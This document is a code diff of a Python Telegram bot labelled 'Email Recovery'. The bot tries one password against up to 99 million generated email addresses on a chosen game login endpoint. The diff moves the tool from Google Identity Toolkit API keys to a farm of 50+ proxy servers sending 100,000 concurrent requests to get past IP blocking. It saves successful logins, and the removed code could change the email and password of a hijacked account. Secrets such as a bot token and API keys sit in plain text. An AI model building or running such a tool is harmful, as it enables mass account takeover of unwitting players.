@@ -20,15 +20,13 @@ from telegram.ext import (
 )
 
 # ===== CONFIG =====
-CPM1_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
-CPM2_API_KEY = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
 BOT_TOKEN = "8496323687:AAFLhc2UY4Z_afiKNjAFRfpg9i325oiv-UA"
 
 # ===== ADMIN CONFIG =====
-ADMIN_ID = 8650959684  # replace with your Telegram ID
+ADMIN_ID = 8650959684
 
 USERS_FILE = "users.txt"
-API_KEYS_FILE = "api_keys.txt"
+SERVERS_FILE = "servers.txt"
 
 # Load allowed users
 if os.path.exists(USERS_FILE):
@@ -45,39 +43,31 @@ def save_users():
         for uid in allowed_users:
             f.write(f"{uid}\n")
 
-# ===== MULTI-KEY API MANAGEMENT =====
-# Load API keys from file
-API_KEYS_CACHE = {
-    "CPM1": [],
-    "CPM2": []
-}
+# ===== DISTRIBUTED SERVER MANAGEMENT =====
+SERVERS_CACHE = []
 
-def load_api_keys():
-    """Load API keys from api_keys.txt"""
-    if os.path.exists(API_KEYS_FILE):
-        with open(API_KEYS_FILE, "r") as f:
+def load_servers():
+    """Load server list from servers.txt"""
+    global SERVERS_CACHE
+    if os.path.exists(SERVERS_FILE):
+        with open(SERVERS_FILE, "r") as f:
             lines = f.readlines()
             for line in lines:
                 line = line.strip()
                 if line and not line.startswith("#"):
-                    parts = line.split("|")
-                    if len(parts) == 2:
-                        game = parts[0].strip().upper()
-                        key = parts[1].strip()
-                        if game in ["CPM1", "CPM2"]:
-                            API_KEYS_CACHE[game].append(key)
+                    # Format: ip:port or url
+                    SERVERS_CACHE.append(line)
     
-    # Fallback to default keys if no file
-    if not API_KEYS_CACHE["CPM1"]:
-        API_KEYS_CACHE["CPM1"] = [CPM1_API_KEY]
-    if not API_KEYS_CACHE["CPM2"]:
-        API_KEYS_CACHE["CPM2"] = [CPM2_API_KEY]
+    if not SERVERS_CACHE:
+        print("⚠️  No servers configured. Create servers.txt with format:")
+        print("http://192.168.1.100:5000")
+        print("http://192.168.1.101:5000")
 
-load_api_keys()
+load_servers()
 
-def get_api_keys_for_game(game):
-    """Get all API keys for a game"""
-    return API_KEYS_CACHE.get(game, [])
+def get_servers():
+    """Get all available servers"""
+    return SERVERS_CACHE
 
 # ===== ADMIN COMMANDS =====
 
@@ -181,24 +171,32 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text)
 
 
-async def status_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin command to check API keys status"""
+async def status_servers(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Admin command to check server status"""
     if update.effective_user.id != ADMIN_ID:
         return
 
-    cpm1_count = len(get_api_keys_for_game("CPM1"))
-    cpm2_count = len(get_api_keys_for_game("CPM2"))
+    servers = get_servers()
+    num_servers = len(servers)
     
     status_text = f"""
-🔑 **API Keys Status**
+🖥️ **Distributed Servers Status**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-CPM1: **{cpm1_count}** keys
-CPM2: **{cpm2_count}** keys
+Configured Servers: **{num_servers}**
 
 **Estimated Speed (99M emails):**
-- CPM1: ~{max(1, 99000000 // (cpm1_count * 60 if cpm1_count > 0 else 1))} seconds
-- CPM2: ~{max(1, 99000000 // (cpm2_count * 60 if cpm2_count > 0 else 1))} seconds
+- Concurrent: **{num_servers * 2000:,} requests/batch**
+- Speed: **~100K+ emails/sec**
+- Time: **~20-30 minutes**
+
+**Servers:**
 """
+    for i, server in enumerate(servers[:10], 1):
+        status_text += f"{i}. {server}\n"
+    
+    if num_servers > 10:
+        status_text += f"... and {num_servers - 10} more servers\n"
+    
     await update.message.reply_text(status_text, parse_mode="Markdown")
 
 
@@ -212,35 +210,22 @@ async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     game_selection = """
-🔐 **ADMIN: Email Recovery (Multi-Key)**
+🔐 **ADMIN: Email Recovery (50-Server Distributed)**
 ━━━━━━━━━━━━━━━━━━━━━━
-Select Your Game:
+Enter your game login URL:
 
-1️⃣ Type: `cpm1` - Recover CPM1 Accounts
-2️⃣ Type: `cpm2` - Recover CPM2 Accounts
+Example:
+`https://game.com/api/login`
+or
+`https://game.com/login.php`
 
-Which game would you like to recover?
+Type the full login endpoint URL:
 """
     await update.message.reply_text(game_selection, parse_mode="Markdown")
-    context.user_data['step'] = 'admin_recover_game'
+    context.user_data['step'] = 'admin_recover_url'
 
 
-# ===== CPM FUNCTIONS =====
-def login_request(email, password, api_key):
-    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
-    payload = {"email": email, "password": password, "returnSecureToken": True}
-    response = requests.post(url, json=payload)
-    return response.json()
-
-def update_request(id_token, api_key, new_email=None, new_password=None):
-    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
-    payload = {"idToken": id_token, "returnSecureToken": True}
-    if new_email: payload["email"] = new_email
-    if new_password: payload["password"] = new_password
-    response = requests.post(url, json=payload)
-    return response.json()
-
-# ===== ULTRA-FAST EMAIL RECOVERY FUNCTIONS =====
+# ===== SCRAPING FUNCTIONS =====
 def parse_email_pattern(pattern):
     """Parse email patterns like tannercpm(10000)@gmail.com"""
     match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
@@ -256,64 +241,82 @@ def parse_email_pattern(pattern):
     
     return base, start, end, domain
 
-async def fast_check_email(email, password, api_key, session=None):
-    """Fast async email check with error handling"""
+async def scrape_login(email, password, login_url, server_url, session=None):
+    """
+    Scrape game login page via distributed server
+    Uses server as proxy to avoid IP blocking
+    """
     try:
-        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
-        payload = {"email": email, "password": password, "returnSecureToken": True}
+        # Send request through distributed server
+        proxy_url = f"{server_url}/check"
+        
+        payload = {
+            "email": email,
+            "password": password,
+            "login_url": login_url
+        }
         
         if session is None:
             async with aiohttp.ClientSession() as temp_session:
-                async with temp_session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+                async with temp_session.post(
+                    proxy_url, 
+                    json=payload, 
+                    timeout=aiohttp.ClientTimeout(total=10)
+                ) as resp:
                     data = await resp.json()
         else:
-            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            async with session.post(
+                proxy_url, 
+                json=payload, 
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
                 data = await resp.json()
         
-        if "idToken" in data:
-            return "found", data
+        status = data.get("status")
         
-        error = data.get("error", {}).get("message", "")
-        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
+        if status == "found":
+            return "found", data
+        elif status == "not_found":
             return "not_found", None
-        elif "INVALID_PASSWORD" in error:
+        elif status == "wrong_password":
             return "wrong_password", None
         else:
-            return "error", error
+            return "error", data.get("error")
             
     except asyncio.TimeoutError:
         return "timeout", None
     except Exception as e:
         return "error", str(e)
 
-async def check_emails_multi_key_generator(base, start, end, domain, password, api_keys, progress_callback=None):
+async def check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=None):
     """
-    MULTI-KEY PARALLEL: Distributes email range across multiple API keys
-    Each key gets its own chunk and runs 1000 concurrent requests
-    Total concurrency = num_keys × 1000
+    DISTRIBUTED SCRAPING: Distributes emails across 50+ servers
+    Each server handles concurrent requests
+    Total: 50 servers × 2000 concurrent = 100,000 concurrent requests
     
-    For 500 keys: 500,000 concurrent requests!
-    99M emails in ~12 minutes
+    Speed: ~100K+ emails/second
+    99M emails in ~20-30 minutes
     """
     checked = 0
     total = end - start + 1
     found_count = 0
-    num_keys = len(api_keys)
+    num_servers = len(servers)
     
-    if num_keys == 0:
+    if num_servers == 0:
+        print("❌ No servers configured!")
         return
     
-    # Distribute range evenly across all keys
-    chunk_size = total // num_keys
+    # Distribute range evenly across all servers
+    chunk_size = total // num_servers
     
-    # Create tasks for each key's chunk
-    async def process_chunk(key_idx, api_key, chunk_start, chunk_end):
+    # Process each server's chunk concurrently
+    async def process_server_chunk(server_idx, server_url, chunk_start, chunk_end):
         nonlocal checked, found_count
         
-        batch_size = 1000  # Max concurrent per key
+        batch_size = 2000  # Max concurrent per server
         
-        # Reuse session for this key
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1000)) as session:
+        # Reuse session for this server
+        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=2000)) as session:
             for batch_start in range(chunk_start, chunk_end + 1, batch_size):
                 batch_end = min(batch_start + batch_size, chunk_end + 1)
                 
@@ -321,9 +324,9 @@ async def check_emails_multi_key_generator(base, start, end, domain, password, a
                 tasks = []
                 for i in range(batch_start, batch_end):
                     email = f"{base}{i}@{domain}"
-                    tasks.append(fast_check_email(email, password, api_key, session))
+                    tasks.append(scrape_login(email, password, login_url, server_url, session))
                 
-                # Execute all concurrently (1000 at once per key)
+                # Execute all concurrently (2000 at once per server)
                 results = await asyncio.gather(*tasks, return_exceptions=True)
                 
                 # Process results immediately
@@ -339,42 +342,33 @@ async def check_emails_multi_key_generator(base, start, end, domain, password, a
                             found_count += 1
                             yield (email, status, data)
                     
-                    # Progress callback every 100 checks
-                    if progress_callback and checked % 100 == 0:
+                    # Progress callback every 500 checks
+                    if progress_callback and checked % 500 == 0:
                         await progress_callback(checked, total, found_count)
     
-    # Create concurrent tasks for each key's chunk
-    tasks = []
-    for idx, api_key in enumerate(api_keys):
-        chunk_start = start + (idx * chunk_size)
-        chunk_end = chunk_start + chunk_size if idx < num_keys - 1 else end
-        
-        # Each key processes its chunk concurrently
-        task = process_chunk(idx, api_key, chunk_start, chunk_end)
-        tasks.append(task)
-    
-    # Combine all generators and yield results
+    # Create tasks for each server's chunk
     async def merge_generators():
-        tasks_list = [process_chunk(idx, api_keys[idx], 
-                                   start + (idx * chunk_size), 
-                                   start + ((idx + 1) * chunk_size) if idx < num_keys - 1 else end)
-                      for idx in range(num_keys)]
+        tasks_list = [
+            process_server_chunk(
+                idx, 
+                servers[idx], 
+                start + (idx * chunk_size), 
+                start + ((idx + 1) * chunk_size) if idx < num_servers - 1 else end
+            )
+            for idx in range(num_servers)
+        ]
         
-        import asyncio
-        # Create tasks that yield from each generator
-        pending_tasks = set()
-        generators = tasks_list
-        
-        for gen in generators:
+        # Yield from all generators concurrently
+        for gen in tasks_list:
             async for item in gen:
                 yield item
-
+    
     async for item in merge_generators():
         yield item
 
 # ===== SESSIONS =====
-sessions = {}  # user_id -> {id_token, email, game_name, api_keys}
-user_states = {}  # per-user step tracking
+sessions = {}
+user_states = {}
 
 # ===== MENU HELPERS =====
 def build_menu_text(user_id):
@@ -438,10 +432,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if user_id != ADMIN_ID:
             return
         
-        # Parse the input - support comma, newline, or space separated IDs
         ids_text = update.message.text.strip()
         
-        # Try different separators
         if ',' in ids_text:
             user_ids = [x.strip() for x in ids_text.split(',')]
         elif '\n' in ids_text:
@@ -467,7 +459,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         save_users()
         
-        # Build response
         response = "📊 **Bulk Add Results:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
         
         if added:
@@ -487,84 +478,25 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ You are not authorized to use this bot.")
         return
 
-    # ----- MAIN MENU COMMANDS -----
-    if text == "login":
-        if user_id in sessions:
-            await update.message.reply_text("⚠️ You are already logged in. Type `logout` first.")
-            return
-        
-        game_selection = """
-🎮 **Select Your Game:**
-━━━━━━━━━━━━━━━━━━━━━━
-Type one of the following:
-
-1️⃣ Type: `cpm1` - Login to CPM1
-2️⃣ Type: `cpm2` - Login to CPM2
-
-Which game would you like to login to?
-"""
-        await update.message.reply_text(game_selection, parse_mode="Markdown")
-        context.user_data['step'] = 'select_game'
-        return
-
-    elif text == "changemail":
-        if user_id not in sessions:
-            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
-            return
-        context.user_data['step'] = 'changemail'
-        await update.message.reply_text("✉️ Enter your new email address:")
-        return
-
-    elif text == "changepass":
-        if user_id not in sessions:
-            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
-            return
-        context.user_data['step'] = 'changepass'
-        await update.message.reply_text("🔑 Enter your new password:")
-        return
-
-    elif text == "logout":
-        if user_id in sessions:
-            del sessions[user_id]
-            await update.message.reply_text("🚪 Logged out successfully.\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-        else:
-            await update.message.reply_text("⚠️ You are not logged in.", parse_mode="Markdown")
-        context.user_data.clear()
-        return
-
-    # ----- GAME SELECTION -----
-    elif step == 'select_game':
-        if text in ['cpm1', 'cpm2']:
-            game = text.upper()
-            context.user_data['login_game'] = game
-            api_keys = get_api_keys_for_game(game)
-            context.user_data['api_keys'] = api_keys
-            context.user_data['step'] = 'email'
-            await update.message.reply_text(f"📝 Enter your email for {game}:")
-        else:
-            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
-        return
-
-    # ----- ADMIN EMAIL RECOVERY GAME SELECTION -----
-    elif step == 'admin_recover_game':
+    # ----- ADMIN: RECOVER URL INPUT -----
+    elif step == 'admin_recover_url':
         if user_id != ADMIN_ID:
             await update.message.reply_text("❌ Unauthorized.")
             return
-            
-        if text in ['cpm1', 'cpm2']:
-            game = text.upper()
-            api_keys = get_api_keys_for_game(game)
-            num_keys = len(api_keys)
-            
-            context.user_data['recover_game'] = game
-            context.user_data['recover_api_keys'] = api_keys
-            context.user_data['step'] = 'admin_recover_pattern'
-            
-            recover_help = f"""
-📧 **ADMIN: Email Recovery (500-Key Multi-Parallel)**
+        
+        login_url = update.message.text.strip()
+        
+        # Validate URL
+        if not login_url.startswith("http"):
+            await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
+            return
+        
+        context.user_data['recover_login_url'] = login_url
+        context.user_data['step'] = 'admin_recover_pattern'
+        
+        recover_help = """
+📧 **ADMIN: Email Recovery (50-Server Distributed Scraping)**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-**Loaded API Keys: {num_keys}**
 
 Enter an email pattern to check:
 
@@ -573,16 +505,15 @@ Enter an email pattern to check:
 - `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
 - `tannercpm(1-100000)@domain.com` - Checks 100K emails
 
-⚡ **MAXIMUM MULTI-KEY CONCURRENCY**
-- {num_keys} keys × 1000 concurrent each
-- Total: {num_keys * 1000:,} concurrent requests
-- 99M emails in ~{max(1, 99000000 // (num_keys * 1000 * 3))} minutes
+⚡ **DISTRIBUTED SCRAPING (50 SERVERS)**
+- 50 servers × 2000 concurrent each
+- Total: 100,000 concurrent requests
+- Speed: ~100K+ emails/sec
+- 99M emails in ~20-30 minutes
 
 Enter your pattern:
 """
-            await update.message.reply_text(recover_help, parse_mode="Markdown")
-        else:
-            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
+        await update.message.reply_text(recover_help, parse_mode="Markdown")
         return
 
     # ----- ADMIN EMAIL RECOVERY PATTERN -----
@@ -628,30 +559,36 @@ Enter the password to check:
         start = context.user_data['recover_start']
         end = context.user_data['recover_end']
         domain = context.user_data['recover_domain']
-        game = context.user_data['recover_game']
-        api_keys = context.user_data['recover_api_keys']
+        login_url = context.user_data['recover_login_url']
+        
+        servers = get_servers()
+        num_servers = len(servers)
+        
+        if num_servers == 0:
+            await update.message.reply_text("❌ No servers configured! Add servers to servers.txt")
+            context.user_data.clear()
+            return
         
         total = end - start + 1
-        num_keys = len(api_keys)
         
         start_time = time.time()
         
         progress_msg = await update.message.reply_text(f"""
-⚡ **MULTI-KEY PARALLEL EMAIL RECOVERY**
+⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Game: **{game}**
+Login URL: **{login_url}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
 Total: **{total:,} emails**
 Status: **Starting...**
 
-API Keys: **{num_keys}**
-Concurrency: **{num_keys * 1000:,} requests/batch**
+Servers: **{num_servers}**
+Concurrency: **{num_servers * 2000:,} requests/batch**
 """, parse_mode="Markdown")
         
         await context.bot.send_chat_action(update.effective_chat.id, "typing")
         
         # Open file for streaming results
-        filename = f"recovery_{game.lower()}_{int(time.time())}.json"
+        filename = f"recovery_distributed_{int(time.time())}.json"
         found_emails = []
         checked_count = 0
         
@@ -665,37 +602,34 @@ Concurrency: **{num_keys * 1000:,} requests/batch**
             
             try:
                 await progress_msg.edit_text(f"""
-⚡ **MULTI-KEY PARALLEL EMAIL RECOVERY**
+⚡ **DISTRIBUTED SCRAPING EMAIL RECOVERY**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Game: **{game}**
 Pattern: **{base}({start:,}-{end:,})@{domain}**
-Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100)}%)
+Checked: **{checked:,}/{total_emails:,}** ({int(checked/total_emails*100) if total_emails > 0 else 0}%)
 Speed: **{speed:.1f} emails/sec**
 Found: **{found}**
 ETA: **{int(remaining)}s**
-API Keys: **{num_keys}** (Active)
+Servers: **{num_servers}** (Active)
 """, parse_mode="Markdown")
             except:
                 pass
         
-        # Run concurrent check with multiple keys
-        async for email, status, data in check_emails_multi_key_generator(base, start, end, domain, password, api_keys, progress_callback=update_progress):
+        # Run distributed check with generator
+        async for email, status, data in check_emails_distributed_generator(base, start, end, domain, password, login_url, servers, progress_callback=update_progress):
             found_emails.append({
                 "email": email,
-                "password": password,
-                "game": game
+                "password": password
             })
         
         elapsed = time.time() - start_time
         
         # Create output file with results
         output_data = {
-            "game": game,
             "pattern": f"{base}({start:,}-{end:,})@{domain}",
             "total_checked": total,
             "time_seconds": round(elapsed, 2),
             "speed_emails_per_sec": round(total/elapsed, 2) if elapsed > 0 else 0,
-            "api_keys_used": num_keys,
+            "servers_used": num_servers,
             "found_count": len(found_emails),
             "successful_logins": found_emails
         }
@@ -709,11 +643,10 @@ API Keys: **{num_keys}** (Active)
             results_text = f"""
 ✅ **RECOVERY COMPLETE**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Game: **{game}**
 Found: **{len(found_emails)} account(s)** ✅
 Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
 Speed: **{total/elapsed:.1f} emails/sec**
-API Keys: **{num_keys}**
+Servers: **{num_servers}**
 
 📄 Results saved to file
 """
@@ -730,94 +663,9 @@ No matching accounts found.
 Checked: **{total:,}** emails
 Time: **{elapsed:.1f}s** ({elapsed/60:.1f} minutes)
 Speed: **{total/elapsed:.1f} emails/sec**
-API Keys: **{num_keys}**
+Servers: **{num_servers}**
 """, parse_mode="Markdown")
         
-        context.user_data.clear()
-        return
-
-    # ----- EMAIL -----
-    elif step == 'email':
-        context.user_data['email'] = text
-        context.user_data['step'] = 'password'
-        await update.message.reply_text("🔒 Now enter your password:")
-        return
-
-    # ----- PASSWORD -----
-    elif step == 'password':
-        email = context.user_data['email']
-        password = text
-        api_keys = context.user_data['api_keys']
-        game_name = context.user_data['login_game']
-
-        # Use first key for login
-        api_key = api_keys[0] if api_keys else (CPM1_API_KEY if game_name == "CPM1" else CPM2_API_KEY)
-
-        # simulate loading
-        await context.bot.send_chat_action(update.effective_chat.id, "typing")
-        await asyncio.sleep(2)
-
-        resp = login_request(email, password, api_key)
-        if "idToken" not in resp:
-            error_msg = resp.get("error", {}).get("message", "Unknown error")
-            await update.message.reply_text(f"❌ Login failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-            context.user_data.clear()
-            return
-
-        sessions[user_id] = {
-            "id_token": resp["idToken"],
-            "email": resp.get("email", email),
-            "game_name": game_name,
-            "api_keys": api_keys
-        }
-        await update.message.reply_text(f"✅ Logged in as {sessions[user_id]['email']} ({game_name})\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-        context.user_data.clear()
-        return
-
-    # ----- CHANGE EMAIL -----
-    elif step == 'changemail':
-        if user_id not in sessions:
-            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
-            context.user_data.clear()
-            return
-        new_email = text
-        s = sessions[user_id]
-        api_key = s['api_keys'][0] if s['api_keys'] else CPM1_API_KEY
-
-        await context.bot.send_chat_action(update.effective_chat.id, "typing")
-        await asyncio.sleep(1.5)
-
-        change_resp = update_request(s['id_token'], api_key, new_email=new_email)
-        if "email" in change_resp:
-            s['email'] = change_resp['email']
-            s['id_token'] = change_resp.get('idToken', s['id_token'])
-            await update.message.reply_text(f"✉️ Email updated to {s['email']}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-        else:
-            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
-            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-        context.user_data.clear()
-        return
-
-    # ----- CHANGE PASSWORD -----
-    elif step == 'changepass':
-        if user_id not in sessions:
-            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
-            context.user_data.clear()
-            return
-        new_pass = text
-        s = sessions[user_id]
-        api_key = s['api_keys'][0] if s['api_keys'] else CPM1_API_KEY
-
-        await context.bot.send_chat_action(update.effective_chat.id, "typing")
-        await asyncio.sleep(1.5)
-
-        change_resp = update_request(s['id_token'], api_key, new_password=new_pass)
-        if "idToken" in change_resp:
-            s['id_token'] = change_resp['idToken']
-            await update.message.reply_text(f"🔑 Password changed successfully\n\n" + build_menu_text(user_id), parse_mode="Markdown")
-        else:
-            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
-            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
         context.user_data.clear()
         return
 
@@ -832,11 +680,12 @@ app.add_handler(CommandHandler("add", add_user))
 app.add_handler(CommandHandler("remove", remove_user))
 app.add_handler(CommandHandler("bulkadd", bulk_add_users))
 app.add_handler(CommandHandler("users", list_users))
-app.add_handler(CommandHandler("status", status_recovery))
+app.add_handler(CommandHandler("status", status_servers))
 app.add_handler(CommandHandler("recover", admin_recover))
 app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
 
 print("🚀 Bot is running...")
-print(f"CPM1 Keys: {len(get_api_keys_for_game('CPM1'))}")
-print(f"CPM2 Keys: {len(get_api_keys_for_game('CPM2'))}")
+print(f"Configured Servers: {len(get_servers())}")
+if len(get_servers()) == 0:
+    print("⚠️  Add servers to servers.txt (format: http://ip:port)")
 app.run_polling()
